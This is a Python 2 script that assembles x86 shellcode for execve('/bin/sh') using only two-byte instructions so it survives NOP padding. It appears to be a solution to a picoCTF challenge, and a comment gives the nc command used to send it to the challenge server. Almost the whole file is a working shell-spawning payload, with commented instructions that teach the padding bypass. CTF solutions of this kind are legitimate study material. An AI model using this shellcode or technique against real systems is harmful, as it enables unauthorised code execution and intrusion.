#!/bin/python2

# basically we're only allowed to have 2 byte instructions, as every 4 bytes are split and padded with NOPs
# i.e : 0x41414242 will turn into 0x90904141 0x90904242 on the stack. therefore i'll construct a shellcode that
# only has fitting instructions


# first we'll push "/bin/sh\x00" to the stack, i've got a really fun way to do it by putting one byte in al at a time and shifting it to the left.


# to get flag use: (./gen_shellcode.py;cat) | nc mercury.picoctf.net 28494

sc = ""



# push "\x00"
sc += '1\xc0' # xor eax, eax
sc  += 'P\x90' # push eax, nop

# push "//sh"
sc  += '\xb0h' # mov al, 'h'
sc  += '\xd1\xe0' * 8 # shl eax, 1  * 8
sc  += '\xb0s' # mov al, 's'
sc  += '\xd1\xe0' * 8 # shl eax, 1  * 8
sc  += '\xb0/' # mov al, '/'
sc  += '\xd1\xe0' * 8 # shl eax, 1  * 8
sc  += '\xb0/' # mov al, '/'
sc  += 'P\x90' # push eax, nop


# push "/bin"
sc  += '\xb0n' # mov al, 'n'
sc  += '\xd1\xe0' * 8 # shl eax, 1  * 8
sc  += '\xb0i' # mov al, 'i'
sc  += '\xd1\xe0' * 8 # shl eax, 1  * 8
sc  += '\xb0b' # mov al, 'b'
sc  += '\xd1\xe0' * 8 # shl eax, 1  * 8
sc  += '\xb0/' # mov al, '/'
sc  += 'P\x90' # push eax, nop


sc += '\x89\xe3' # mov ebx, esp

sc += 'j\x00' # push 0
sc += 'S\x90' # push ebx; nop
sc += '\x89\xe1' # mov ecx, esp
sc += '1\xc0' # xor eax, eax
sc += '1\xd2' # xor edx, edx
sc += '\xb0\x0b' # mov al, 0xb # hahahahahahaha
sc += '\xcd\x80' # int 0x80

print(sc)
